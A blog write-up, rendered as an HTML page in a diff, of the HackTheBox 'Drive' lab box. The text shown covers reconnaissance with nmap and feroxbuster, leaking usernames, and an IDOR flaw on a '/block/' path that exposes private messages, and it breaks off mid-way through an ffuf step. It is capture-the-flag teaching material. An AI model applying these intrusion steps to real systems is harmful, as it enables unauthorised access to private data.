@@ -1,0 +1,1776 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Drive is a hard difficulty box with a complex message board service, designed to mimic Google Drive. With thorough analysis, we can find that not all avenues are protected from IDOR attacks, allowing us to view hidden messages containing a shared password. Using this password to enter the system, we can find an internally hosted gitea server. The source code shows a zipping password in use, as well as noting changes to the database's password hashing algorithm. We can target the period where the weakest SHA1 hashing method was used, and crack a user's password currently in use. Finally, we see a custom binary with SUID, designed to provide administrative actions to the service from the command line. It is vulnerable to SQL injection, where we might load a malicious shared object to escalate our privileges to root authority.">
+<title>HackTheBox - Drive</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hackthebox-drive/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Drive">
+<meta property='og:description' content="Drive is a hard difficulty box with a complex message board service, designed to mimic Google Drive. With thorough analysis, we can find that not all avenues are protected from IDOR attacks, allowing us to view hidden messages containing a shared password. Using this password to enter the system, we can find an internally hosted gitea server. The source code shows a zipping password in use, as well as noting changes to the database's password hashing algorithm. We can target the period where the weakest SHA1 hashing method was used, and crack a user's password currently in use. Finally, we see a custom binary with SUID, designed to provide administrative actions to the service from the command line. It is vulnerable to SQL injection, where we might load a malicious shared object to escalate our privileges to root authority.">
+<meta property='og:url' content='http://localhost:1313/p/hackthebox-drive/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Gitea' /><meta property='article:tag' content='IDOR' /><meta property='article:tag' content='SQLite' /><meta property='article:tag' content='SQL Injection' /><meta property='article:tag' content='Port Forwarding' /><meta property='article:tag' content='msfvenom' /><meta property='article:tag' content='FFUF' /><meta property='article:published_time' content='2024-02-17T19:46:53-06:00'/><meta property='article:modified_time' content='2024-02-17T19:46:53-06:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-drive/Drive.png' />
+<meta name="twitter:title" content="HackTheBox - Drive">
+<meta name="twitter:description" content="Drive is a hard difficulty box with a complex message board service, designed to mimic Google Drive. With thorough analysis, we can find that not all avenues are protected from IDOR attacks, allowing us to view hidden messages containing a shared password. Using this password to enter the system, we can find an internally hosted gitea server. The source code shows a zipping password in use, as well as noting changes to the database's password hashing algorithm. We can target the period where the weakest SHA1 hashing method was used, and crack a user's password currently in use. Finally, we see a custom binary with SUID, designed to provide administrative actions to the service from the command line. It is vulnerable to SQL injection, where we might load a malicious shared object to escalate our privileges to root authority."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-drive/Drive.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#exploring-webapp">Exploring Webapp</a>
+          <ol>
+            <li><a href="#leaking-registered-usernames">Leaking registered usernames</a></li>
+            <li><a href="#feroxbuster-results">Feroxbuster Results</a></li>
+            <li><a href="#abusing-idor-to-view-private-messages">Abusing IDOR to view private messages</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#utilizing-password-shared-in-private-messages">Utilizing password shared in private messages</a></li>
+      </ol>
+    </li>
+    <li><a href="#lateral-movement">Lateral Movement</a>
+      <ol>
+        <li><a href="#abusing-weak-hash-algorithms-to-crack-database-passwords">Abusing weak hash algorithms to crack database passwords</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#extracting-stored-credentials-from-compiled-binary">Extracting stored credentials from compiled binary</a></li>
+        <li><a href="#sql-injection-to-load-a-malicious-shared-object-file">SQL injection to load a malicious shared object file</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-drive/">
+                <img src="/p/hackthebox-drive/Drive_hu9679367179647861327.png"
+                        srcset="/p/hackthebox-drive/Drive_hu9679367179647861327.png 800w, /p/hackthebox-drive/Drive_hu785330676078431141.png 1600w"
+                        width="800" 
+                        height="666" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Drive" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-drive/">HackTheBox - Drive</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Drive is a hard difficulty box with a complex message board service, designed to mimic Google Drive. With thorough analysis, we can find that not all avenues are protected from IDOR attacks, allowing us to view hidden messages containing a shared password. Using this password to enter the system, we can find an internally hosted gitea server. The source code shows a zipping password in use, as well as noting changes to the database&#39;s password hashing algorithm. We can target the period where the weakest SHA1 hashing method was used, and crack a user&#39;s password currently in use. Finally, we see a custom binary with SUID, designed to provide administrative actions to the service from the command line. It is vulnerable to SQL injection, where we might load a malicious shared object to escalate our privileges to root authority.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 17, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    16 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration
+</h2><p>initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.129.150.85
+</span></span><span class="line"><span class="cl">Host is up (0.061s latency).
+</span></span><span class="line"><span class="cl">Not shown: 997 closed tcp ports (conn-refused)
+</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
+</span></span><span class="line"><span class="cl">|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp   open     http    nginx 1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://drive.htb/
+</span></span><span class="line"><span class="cl">3000/tcp filtered ppp
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We are redirected to <code>drive.htb</code>, so this must be added to /etc/hosts:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ cat /etc/hosts                                    
+</span></span><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">127.0.1.1       kali
+</span></span><span class="line"><span class="cl">::1             localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1         ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2         ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.129.150.85 drive.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="exploring-webapp">Exploring Webapp
+</h3><p>We see what is presumably a Google Drive clone, named <code>Doodle Grive</code>.</p>
+<p><img src="/p/hackthebox-drive/Images/landingpage.png"
+	width="957"
+	height="610"
+	srcset="/p/hackthebox-drive/Images/landingpage_hu12979821747203843507.png 480w, /p/hackthebox-drive/Images/landingpage_hu18150590424832558462.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="376px"
+	
+></p>
+<p>Entering home turns out to be a little different than the main page:</p>
+<p><img src="/p/hackthebox-drive/Images/home1.png"
+	width="1747"
+	height="312"
+	srcset="/p/hackthebox-drive/Images/home1_hu913640840232345223.png 480w, /p/hackthebox-drive/Images/home1_hu397106786281705067.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="559"
+		data-flex-basis="1343px"
+	
+></p>
+<p>Trying to view the file redirects us to login, so it looks like we must create an account.
+Due to password complexity requirements, registered with creds <code>asdf:HackTheBoxDrive</code></p>
+<p>After registering, we see the landing page options have changed. We have the option to upload a file, or view currently posted files, shown in the previous image.</p>
+<p><img src="/p/hackthebox-drive/Images/landingpage2.png"
+	width="864"
+	height="606"
+	srcset="/p/hackthebox-drive/Images/landingpage2_hu1252054435397311868.png 480w, /p/hackthebox-drive/Images/landingpage2_hu14989104037057906149.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="142"
+		data-flex-basis="342px"
+	
+></p>
+<p>When viewing the welcome post, I notice the url info as well as how the text is generated after clicking <code>Just View</code>.</p>
+<p><img src="/p/hackthebox-drive/Images/view1.png"
+	width="752"
+	height="459"
+	srcset="/p/hackthebox-drive/Images/view1_hu15262456809908293379.png 480w, /p/hackthebox-drive/Images/view1_hu13643999400009288099.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="393px"
+	
+></p>
+<p>The 100 might be a beginning number sequence related to each post view. It is possible that this could be susceptible to IDOR. Trying the upload feature, we see the rules applied to our submissions: it must have ASCII MIME type and be under 2MB in size. Uploaded contents are only treated as text, so there is not much to be gained from this feature.</p>
+<p><img src="/p/hackthebox-drive/Images/upload1.png"
+	width="1197"
+	height="468"
+	srcset="/p/hackthebox-drive/Images/upload1_hu9118527013445787701.png 480w, /p/hackthebox-drive/Images/upload1_hu2852906669309810843.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="613px"
+	
+></p>
+<h4 id="leaking-registered-usernames">Leaking registered usernames
+</h4><p>If we try to create a test group and then edit the group, we can find that all established users are suggested to add, leaking all usernames associated with Doodle Grive.</p>
+<p><img src="/p/hackthebox-drive/Images/usernames.png"
+	width="613"
+	height="456"
+	srcset="/p/hackthebox-drive/Images/usernames_hu15183467364690822206.png 480w, /p/hackthebox-drive/Images/usernames_hu11628965451743423776.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="134"
+		data-flex-basis="322px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jamesMason
+</span></span><span class="line"><span class="cl">martinCruz
+</span></span><span class="line"><span class="cl">tomHands
+</span></span><span class="line"><span class="cl">crisDisel
+</span></span><span class="line"><span class="cl">admin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can enumerate potentially vulnerable directories using feroxbuster:</p>
+<h4 id="feroxbuster-results">Feroxbuster Results
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">feroxbuster</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">drive</span><span class="o">.</span><span class="n">htb</span>     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">___</span>  <span class="n">___</span>  <span class="n">__</span>   <span class="n">__</span>     <span class="n">__</span>      <span class="n">__</span>         <span class="n">__</span>   <span class="n">___</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">__</span>  <span class="o">|</span><span class="n">__</span>  <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="o">|</span><span class="n">__</span><span class="p">)</span> <span class="o">|</span> <span class="o">/</span>  <span class="err">`</span>    <span class="o">/</span>  \ \<span class="n">_</span><span class="o">/</span> <span class="o">|</span> <span class="o">|</span>  \ <span class="o">|</span><span class="n">__</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>    <span class="o">|</span><span class="n">___</span> <span class="o">|</span>  \ <span class="o">|</span>  \ <span class="o">|</span> \<span class="n">__</span><span class="p">,</span>    \<span class="n">__</span><span class="o">/</span> <span class="o">/</span> \ <span class="o">|</span> <span class="o">|</span><span class="n">__</span><span class="o">/</span> <span class="o">|</span><span class="n">___</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">Ben</span> <span class="s2">&#34;epi&#34;</span> <span class="n">Risher</span> <span class="err">🤓</span>                 <span class="n">ver</span><span class="p">:</span> <span class="mf">2.10</span><span class="o">.</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="err">───────────────────────────┬──────────────────────</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/register/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/login/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/upload/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/reports/ </span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/contact/block/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/login/block/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/subscribe/block/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/home/block/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/register/block/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/logout/block/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/upload/block/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 11m    30000/30000   46/s    http://drive.htb/reports/block/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 3m     30000/30000   146/s   http://drive.htb/password_reset/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 3m     30000/30000   161/s   http://drive.htb/password_reset/block/ </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="c1">####################] - 2m     30000/30000   262/s   http://drive.htb/password_reset/done/</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It is worth noting that each visiting directory also has a <code>/&lt;dir&gt;/block</code> variant. Although I am not too familiar, perhaps this is a product of the web service being utilized?</p>
+<h4 id="abusing-idor-to-view-private-messages">Abusing IDOR to view private messages
+</h4><p>Whe we try to abuse IDOR on views, we are presented with <code>unauthorized</code> flag:</p>
+<p><img src="/p/hackthebox-drive/Images/unauthorized.png"
+	width="527"
+	height="136"
+	srcset="/p/hackthebox-drive/Images/unauthorized_hu8793333650507176800.png 480w, /p/hackthebox-drive/Images/unauthorized_hu11630723902898305783.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="387"
+		data-flex-basis="930px"
+	
+></p>
+<p>If we try to access a file not produced already, we receive a different message:</p>
+<p><img src="/p/hackthebox-drive/Images/servererror.png"
+	width="513"
+	height="223"
+	srcset="/p/hackthebox-drive/Images/servererror_hu3854662734896427683.png 480w, /p/hackthebox-drive/Images/servererror_hu16821205882179070983.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="230"
+		data-flex-basis="552px"
+	
+></p>
+<p>We can leak all file numbers associated with created files if we utilize a tool like <code>ffuf</code>. However, it appears it is not necessary. We might eventually find that we can successfully IDOR to unauthorized files using the <code>/&lt;dir&gt;/block</code> variant:</p>
+<p><img src="/p/hackthebox-drive/Images/101.png"
+	width="970"
+	height="497"
+	srcset="/p/hackthebox-drive/Images/101_hu4334636787803548016.png 480w, /p/hackthebox-drive/Images/101_hu13899485502291405819.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="468px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">hi</span> <span class="n">team</span><span class="o">!</span>  
+</span></span><span class="line"><span class="cl"><span class="n">me</span> <span class="ow">and</span> <span class="n">my</span> <span class="n">friend</span><span class="p">(</span><span class="n">Cris</span><span class="p">)</span> <span class="n">created</span> <span class="n">a</span> <span class="n">new</span> <span class="n">scheduled</span> <span class="n">backup</span> <span class="n">plan</span> <span class="k">for</span> <span class="n">the</span> <span class="n">database</span>  
+</span></span><span class="line"><span class="cl"><span class="n">the</span> <span class="n">database</span> <span class="n">will</span> <span class="n">be</span> <span class="n">automatically</span> <span class="n">highly</span> <span class="n">compressed</span> <span class="ow">and</span> <span class="n">copied</span> <span class="n">to</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups</span><span class="o">/</span> <span class="n">by</span> <span class="n">a</span> <span class="n">small</span> <span class="n">bash</span> <span class="n">script</span> <span class="n">every</span> <span class="n">day</span> <span class="n">at</span> <span class="mi">12</span><span class="p">:</span><span class="mi">00</span> <span class="n">AM</span>  
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Note</span><span class="p">:</span> <span class="n">the</span> <span class="n">backup</span> <span class="n">directory</span> <span class="n">may</span> <span class="n">change</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">future</span><span class="o">!</span>  
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Note2</span><span class="p">:</span> <span class="n">the</span> <span class="n">backup</span> <span class="n">would</span> <span class="n">be</span> <span class="n">protected</span> <span class="n">with</span> <span class="n">strong</span> <span class="n">password</span><span class="o">!</span> <span class="n">don</span><span class="s1">&#39;t even think to crack it guys! :)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From our previous leak of established users, we can guess that Cris is referring to the user <code>crisDisel</code>. From here, I proceed to view all messages by visiting <code>http://drive.htb/&lt;NUM&gt;/block/</code>.</p>
+<h5 id="fuzzing-numbers-for-valid-messages">Fuzzing numbers for valid messages
+</h5><p>Rather than check manually, here is where we can utilize <code>ffuf</code> to quickly find the ones worth looking at:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
